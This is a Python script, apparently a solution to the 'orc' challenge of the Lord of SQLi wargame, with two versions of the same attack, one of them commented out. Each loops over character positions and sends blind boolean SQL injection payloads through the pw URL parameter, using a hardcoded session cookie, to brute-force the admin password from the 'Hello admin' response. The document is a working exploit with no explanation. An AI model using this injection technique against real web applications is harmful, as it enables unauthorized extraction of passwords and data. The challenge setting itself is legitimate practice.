"""
import requests as req

cookies = {'PHPSESSID':'o2pckaqae4ut5c0g5k3e7m4j8p'}
pwd = ""
for i in range(1, 9):
    for j in range(48, 128):
        char = chr(j)
        url = f"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw='or id='admin' and substr(pw,{i},1)='{char}' -- "
        res = req.get(url=url, cookies=cookies)
        if 'Hello admin' in res.text:
            pwd += char

print("============================")
print(f"pwd = {pwd}")
print("============================")
"""

import requests as req
pwd=""
cookies = {'PHPSESSID':'o2pckaqae4ut5c0g5k3e7m4j8p'}
string = "1234567890abcdefghijklmnopqrstuvwxyz"
for i in range(1,9):
    for j in string:
        url = f"https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php?pw='or id='admin' and substr(pw,{i},1)='{j}' -- "
        res = req.get(url=url, cookies=cookies)
        if 'Hello admin' in res.text:
            pwd += j

print(pwd)
